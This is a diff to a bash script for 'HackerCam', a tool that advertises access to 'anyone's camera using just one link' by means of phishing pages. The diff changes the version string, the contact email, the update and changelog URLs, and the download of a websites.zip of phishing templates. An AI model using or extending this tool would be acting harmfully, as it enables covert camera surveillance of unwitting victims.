@@ -1,11 +1,10 @@
 #!/bin/bash
 
 # HackerCam
-# Version    : 1.0
+# Version    : 1.0.0
 # Author     : k4itrun
 # Github     : https://github.com/k4itrun
-# Email      : k4itrun@6889.fun
-# Telegram   : https//t.me/k4itrun
+# Email      : tsx@billoneta.xyz
 # Credits    : LinuxChoice & techchipnet/CamPhish
 # Date       : 20-10-2023
 # License    : MIT
@@ -48,7 +47,7 @@ info2="${green}[${bwhite}•${green}] ${bggray}"
 ask="${green}[${bwhite}?${green}] ${bblue}"
 
 # version
-version="1.0"
+version="1.0.0"
 
 cwd=`pwd`
 tunneler_dir="$HOME/.tunneler"
@@ -62,7 +61,7 @@ ${green} ███████║███████║██║░░╚═�
 ${lgreen} ██╔══██║██╔══██║██║░░██╗██╔═██╗░██╔══╝░░██╔══██╗██║░░██╗██╔══██║██║╚██╔╝██║
 ${green} ██║░░██║██║░░██║╚█████╔╝██║░╚██╗███████╗██║░░██║╚█████╔╝██║░░██║██║░╚═╝░██║
 ${lgreen} ╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝
-${green}                                 ${red}[v1.0]
+${green}                                 ${red}[v${version}]
 ${lgreen}                              ${red}[By k4itrun]
 "
 
@@ -384,14 +383,14 @@ if [[ -z $UPDATE ]]; then
     exit 1
 else
     if [[ $UPDATE == true ]]; then
-        git_ver=`curl -s -N https://raw.githubusercontent.com/k4itrun/HackerCam/main/assets/version.txt`
+        git_ver=`curl -s -N https://raw.githubusercontent.com/k4itrun/hackercam/refs/heads/main/.github/VERSION.md`
     else
         git_ver=$version
     fi
 fi
 
 if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
-    changelog=$(curl -s -N https://raw.githubusercontent.com/k4itrun/HackerCam/main/assets/changelog.log)
+    changelog=$(curl -s -N https://raw.githubusercontent.com/k4itrun/hackercam/refs/heads/main/CHANGELOG.md)
     clear
     echo -e "$logo"
     echo -e "${info}HackerCam has a new update available!\n${info}Current: ${red}${version}\n${info}Available: ${green}${git_ver}\n"
@@ -399,7 +398,7 @@ if [[ "$git_ver" != "404: Not Found" && "$git_ver" != "$version" ]]; then
         read upask
         printf "$nc"
         if [[ "$upask" == "y" ]]; then
-            cd .. && rm -rf HackerCam HackerCam && git clone https://github.com/k4itrun/HackerCam
+            cd .. && rm -rf HackerCam HackerCam && git clone https://github.com/k4itrun/hackercam
             echo -e "\n${success}HackerCam updated successfully!!"
             if [[ "$changelog" != "404: Not Found" ]]; then
                 echo -e "${purple}[•] Changelog:\n${blue}"
@@ -525,8 +524,7 @@ $red[Version]    ${bwhite} :[${version}]
 $red[Description]${bwhite} :[Access anyone's camera using just one link]
 $red[Author]     ${bwhite} :[k4itrun]
 $red[Github]     ${bwhite} :[https://github.com/k4itrun]
-$red[Messenger]  ${bwhite} :[https://t.me/k4itrun]
-$red[Email]      ${bwhite} :[k4itrun@6889.fun]"
+$red[Email]      ${bwhite} :[tsx@billoneta.xyz]"
         printf "$ch_prompt"
         read about
     elif echo $option | grep -q "m"; then
@@ -555,7 +553,7 @@ fi
 if ! [ -d websites ]; then
     mkdir websites
     netcheck
-    wget -q --show-progress "https://github.com/k4itrun/HackerCam/releases/latest/download/websites.zip"
+    wget -q --show-progress "https://github.com/k4itrun/hackercam/releases/download/1.0.0/websites.zip"
     unzip websites.zip -d websites > /dev/null 2>&1
     rm -rf websites.zip
 fi
